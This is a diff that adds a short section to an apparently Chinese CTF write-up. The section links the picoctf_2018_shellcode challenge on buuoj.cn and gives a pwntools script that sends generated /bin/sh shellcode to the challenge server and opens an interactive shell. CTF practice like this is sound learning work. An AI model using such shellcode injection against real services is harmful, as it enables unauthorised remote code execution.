@@ -864,3 +864,26 @@ if __name__ == "__main__":
     main()
 
 ```
+
+[几乎一模一样的题：picoctf_2018_shellcode](https://buuoj.cn/challenges#picoctf_2018_shellcode)
+
+```
+# written by Sonnety
+from pwn import *
+context.arch = "i386"
+
+host = "node5.buuoj.cn"
+port = 29289
+shellcode = asm(shellcraft.sh())
+
+def main():
+    io = remote(host,port)
+    io.recvuntil(b"Enter a string!\n")
+    io.sendline(shellcode)
+    io.recvline()
+    io.recvuntil(b"Thanks! Executing now...\n")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
